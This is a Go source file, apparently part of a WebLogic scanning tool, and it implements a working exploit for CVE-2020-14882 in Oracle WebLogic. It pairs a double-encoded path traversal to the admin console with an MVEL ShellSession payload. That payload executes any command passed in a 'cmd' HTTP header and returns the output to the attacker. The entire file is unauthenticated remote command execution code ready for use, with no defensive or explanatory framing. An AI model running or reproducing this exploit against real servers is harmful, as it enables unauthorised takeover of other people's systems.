package CVE_2020_14882Exp

import (
	"WeblogicScan/config"
	"fmt"
)

var Payload = "_nfpb=true&_pageLabel=&handle='\n            'com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = '\n            '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '\n            'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'\n            '(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'\n            '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '\n            'obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); '\n            'String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]'\n            '{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if (cmd != null) { String result '\n            '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'\n            '(\"\\\\\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'\n            'ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);'\n            'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'\n            'res.getServletOutputStream().flush(); res.getWriter().write(\"\"); }executeThread.interrupt(); \");"

func cve_2020_14882(url string, cmd string) {
	url = url + "/console/css/%252e%252e%252fconsole.portal"
	resp, err := config.Client.R().
		SetHeader("User-Agent", config.Fakeua()).
		SetHeader("cmd", cmd).
		SetBody("data=" + Payload).
		Post(url)
	if err != nil { // Error handling.
		fmt.Printf("[-] Target weblogic not detected CVE-2020-14882\n")
		return
	}
	fmt.Println(resp)
	return
}
func Run(u string, port string, cmd string) {
	url := "http://" + u + ":" + port
	cve_2020_14882(url, cmd)
}
